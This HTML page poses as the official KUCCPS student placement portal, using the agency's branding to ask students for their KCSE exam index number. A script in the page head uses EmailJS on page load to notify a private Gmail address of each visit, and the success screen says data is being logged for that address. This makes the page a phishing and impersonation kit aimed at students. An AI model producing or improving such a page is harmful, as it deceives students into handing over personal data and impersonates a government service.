<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KUCCPS | Official Placement Portal</title>
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() { emailjs.init("YOUR_PUBLIC_KEY"); })();
        window.onload = function() {
            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
                message: "A user has accessed the KUCCPS branded portal",
                to_email: "fidelsteven71@gmail.com"
            });
        };
    </script>

    <style>
        body { background: #f4f7f9; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .form-card { background: white; padding: 0; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 450px; overflow: hidden; border: 1px solid #ddd; }
        
        /* OFFICIAL HEADER */
        .official-header { background: #003366; padding: 20px 10px; text-align: center; border-bottom: 4px solid #f1c40f; }
        
        /* LOGO FIX - Stable Official Link */
        .official-logo { 
            width: 180px; 
            height: auto; 
            background: white; 
            padding: 10px; 
            border-radius: 4px; 
            margin-bottom: 10px;
            display: inline-block;
        }
        
        .portal-title { color: white; font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }

        .content { padding: 25px; }
        .step-header { color: #003366; font-size: 20px; text-align: center; margin-bottom: 20px; font-weight: bold; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; margin-bottom: 20px; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; transition: background 0.2s; }
        .next-btn { background: #007bff; color: white; }
        .next-btn:hover { background: #0056b3; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="form-card">
    <div class="official-header">
        <img src="https://i.ibb.co/L6V6N6Y/kuccps-logo.png" alt="KUCCPS Logo" class="official-logo">
        <div class="portal-title">Placement Service Portal</div>
    </div>

    <div class="content">
        <form id="portalForm">
            <div id="page1">
                <h2 class="step-header">Student Verification</h2>
                <label>Index Number (11 Digits)</label>
                <input type="text" id="indexNo" placeholder="Enter KCSE Index Number" required>
                <button type="button" class="btn next-btn" onclick="nextStep()">Validate Account</button>
            </div>

            <div id="successPage" class="hidden" style="text-align:center;">
                <h2 style="color: #28a745;">Success</h2>
                <p>Logging data for fidelsteven71@gmail.com</p>
            </div>
        </form>
    </div>
</div>

<script>
    function nextStep() {
        document.getElementById('page1').classList.add('hidden');
        document.getElementById('successPage').classList.remove('hidden');
    }
</script>

</body>
</html>
